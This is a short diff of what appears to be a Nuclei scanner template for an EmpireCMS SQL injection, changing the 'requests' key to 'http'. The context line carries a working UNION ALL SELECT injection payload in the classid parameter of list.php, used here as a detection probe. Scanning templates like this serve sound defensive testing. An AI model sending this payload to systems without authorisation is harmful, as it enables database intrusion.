@@ -6,7 +6,7 @@ info:
   severity: high
   tags: EmpireCMS,sqli
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/ikaimi/rolling/list.php?line=10&page=&classid=10)%20UNION%20ALL%20SELECT%20CONCAT(0x71786a7171,md5(123),0x716a6b6b71),NULL,NULL,NULL,NULL--+-"
